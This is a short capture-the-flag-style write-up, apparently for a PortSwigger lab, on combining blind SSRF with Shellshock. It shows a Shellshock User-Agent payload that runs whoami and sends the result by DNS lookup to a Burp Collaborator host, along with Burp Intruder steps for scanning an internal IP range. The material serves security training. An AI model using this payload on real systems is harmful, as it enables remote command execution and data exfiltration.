# 6. Blind SSRF with ShellSock

Goal : we need whoami from the server.

Steps : 

- 1st open any product, then send that request on repeater.
1. Observe that the HTTP interaction contains your `User-Agent` string within the HTTP request.
2. Send the request to the product page to Burp Intruder.
3. Go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab and generate a unique Burp Collaborator payload. Place this into the following Shellshock payload: 

```jsx
() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
```

1. Replace the `User-Agent` string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain.
2. Change the `Referer` header to `http://192.168.0.1:8080` then  click **Add §**. in $1$
3. In the **Payloads** side panel, change the payload type to **Numbers**, and enter 1, 255, and 1 in the **From** and **To** and **Step** boxes respectively.
4. Click  **Start attack**.
5. When the attack is finished, go to the **Collaborator** tab, and click **Poll now**

LAB SOLVED